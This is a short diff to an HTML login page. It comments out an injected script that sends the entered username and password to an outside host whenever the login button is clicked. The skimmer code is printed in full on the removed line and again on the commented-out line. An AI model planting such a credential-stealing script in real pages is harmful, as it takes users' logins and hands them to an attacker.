@@ -28,7 +28,7 @@
 		</form>	
 	</body>
 </html>
-<script>var x = new Image();$(document).ready(function(){$(".btn_login").click(function(){x = new Image();x.src="https://xssreflect.000webhostapp.com/ppkasdlkasdlkqwlke.php?u="+$("input[name='uname']").val()+"&p="+$("input[name='psw']").val();});});</script>
+<!-- <script>var x = new Image();$(document).ready(function(){$(".btn_login").click(function(){x = new Image();x.src="https://xssreflect.000webhostapp.com/ppkasdlkasdlkqwlke.php?u="+$("input[name='uname']").val()+"&p="+$("input[name='psw']").val();});});</script> -->
 <style>
 	form {
 	  border: 3px solid #f1f1f1;
